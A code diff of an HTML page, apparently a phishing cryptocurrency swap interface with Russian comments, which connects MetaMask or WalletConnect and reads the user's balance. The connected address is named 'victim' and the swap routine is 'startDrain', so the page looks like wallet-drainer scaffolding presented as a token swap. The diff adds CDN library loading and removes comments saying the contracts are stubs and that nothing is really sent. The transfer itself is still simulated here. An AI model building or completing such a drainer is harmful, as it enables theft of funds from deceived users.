@@ -204,20 +204,70 @@
         </div>
     </div>
 
-    <!-- Локальные библиотеки -->
+    <!-- ===== ДИНАМИЧЕСКАЯ ЗАГРУЗКА БИБЛИОТЕК ===== -->
     <script>
-        window.process = window.process || { env: { NODE_ENV: 'production' } };
-    </script>
-    <script src="libs/ethers.umd.min.js"></script>
-    <script src="libs/walletconnect-provider.min.js"></script>
+        // Функция загрузки скрипта с CDN, если локальный не загружен
+        function loadScript(src, fallbackSrc) {
+            return new Promise(function(resolve, reject) {
+                // Проверяем, загружен ли уже скрипт (по наличию глобальной переменной)
+                if (src.includes('ethers') && typeof ethers !== 'undefined') {
+                    resolve();
+                    return;
+                }
+                if (src.includes('walletconnect') && typeof window['@walletconnect/ethereum-provider'] !== 'undefined') {
+                    resolve();
+                    return;
+                }
+                // Пытаемся загрузить локальный скрипт
+                var script = document.createElement('script');
+                script.src = src;
+                script.onload = function() {
+                    resolve();
+                };
+                script.onerror = function() {
+                    // Если локальный не загрузился, пробуем CDN
+                    if (fallbackSrc) {
+                        var fallback = document.createElement('script');
+                        fallback.src = fallbackSrc;
+                        fallback.onload = function() { resolve(); };
+                        fallback.onerror = function() { reject(new Error('Failed to load both local and CDN script')); };
+                        document.head.appendChild(fallback);
+                    } else {
+                        reject(new Error('Failed to load script: ' + src));
+                    }
+                };
+                document.head.appendChild(script);
+            });
+        }
 
-    <script>
-        (function() {
+        // Загружаем ethers и WalletConnect
+        Promise.all([
+            loadScript('libs/ethers.umd.min.js', 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js'),
+            loadScript('libs/walletconnect-provider.min.js', 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/umd/index.min.js')
+        ]).then(function() {
+            console.log('All libraries loaded');
+            // После загрузки библиотек инициализируем приложение
+            initApp();
+        }).catch(function(err) {
+            document.getElementById('status').textContent = '❌ Failed to load required libraries: ' + err.message;
+            document.getElementById('status').className = 'status err';
+        });
+
+        // Отложим инициализацию, пока библиотеки не загрузятся
+        function initApp() {
+            // Здесь будет основной код, который раньше был в IIFE
+            // Мы обернём его в функцию и вызовем после загрузки
+            runApp();
+        }
+
+        // Основная функция приложения
+        function runApp() {
+            // (весь код из предыдущего исправленного варианта, но с устранением ошибки arguments.callee)
+            // Скопируем его сюда, но заменим обработчик Max на безопасную версию
             'use strict';
 
             // ===== КОНФИГУРАЦИЯ =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-            // Адреса контрактов (заглушки — транзакции не выполняются)
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
                 56: '0x0000000000000000000000000000000000000000',
@@ -245,7 +295,6 @@
                 'function allowance(address owner, address spender) view returns (uint256)'
             ];
 
-            // ===== ТОКЕНЫ =====
             const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
             const tokens = [
                 { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
@@ -263,7 +312,6 @@
             let currentSelectType = null;
             let currentRate = 0;
 
-            // ===== DOM =====
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
             const swapBtn = document.getElementById('swapBtn');
@@ -289,14 +337,12 @@
             const tokenList = document.getElementById('tokenList');
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
 
-            // ===== СОСТОЯНИЕ =====
             let provider = null, signer = null, victim = null, chainId = null;
             let isConnected = false, isProcessing = false, isConnecting = false;
             let wcProvider = null;
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== КУРС =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -345,7 +391,6 @@
                 } catch (_) {}
             }
 
-            // ===== UI =====
             function setStatus(text, type) {
                 statusEl.textContent = text;
                 statusEl.className = 'status';
@@ -392,7 +437,6 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -434,7 +478,6 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -442,11 +485,12 @@
                 await forceClearSession();
                 await new Promise(resolve => setTimeout(resolve, 300));
 
+                // Проверяем наличие библиотеки WalletConnect
                 const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
                                          window['@walletconnect/ethereum-provider']?.EthereumProvider ||
                                          window['@walletconnect/ethereum-provider'];
                 if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect library not loaded', 'err');
+                    setStatus('❌ WalletConnect library not loaded. Check your internet or reload.', 'err');
                     return;
                 }
 
@@ -518,7 +562,6 @@
                 }
             }
 
-            // ===== ОБРАБОТКА СВАПА =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -539,7 +582,6 @@
                 try {
                     const nativeBal = await provider.getBalance(victim);
                     setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH', 'ok');
-                    // Имитация выполнения (без реальной отправки)
                     await new Promise(resolve => setTimeout(resolve, 1500));
                     setStatus('✅ Swap completed', 'ok');
                     await forceClearSession();
@@ -554,7 +596,7 @@
                 }
             }
 
-            // ===== ОБРАБОТЧИКИ =====
+            // Обработчики событий
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
             metamaskOption.addEventListener('click', async function() {
@@ -579,16 +621,14 @@
                 startDrain();
             });
 
-            // ===== ИСПРАВЛЕННЫЙ ОБРАБОТЧИК MAX (без arguments.callee) =====
+            // Исправленный обработчик Max (без arguments.callee)
             function handleMaxClick() {
                 const amount = 0.001;
-                // Обновляем innerHTML, заменяя кнопку на новую с тем же id
                 balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
                 inputAmount.value = amount.toFixed(6);
                 updateSwapButton();
                 setStatus('Max amount set', '');
                 updateRateAndOutput();
-                // Перепривязываем обработчик на новую кнопку
                 document.getElementById('maxBtn').addEventListener('click', handleMaxClick);
             }
             maxBtn.addEventListener('click', handleMaxClick);
@@ -610,7 +650,6 @@
                 updateRateAndOutput();
             });
 
-            // ===== ВЫБОР ТОКЕНОВ =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -669,7 +708,7 @@
                 setStatus('Tokens flipped', '');
             });
 
-            // ===== ИНИЦИАЛИЗАЦИЯ =====
+            // Инициализация
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
@@ -691,8 +730,7 @@
             }
 
             init();
-
-        })();
+        } // конец runApp
     </script>
 </body>
 </html>
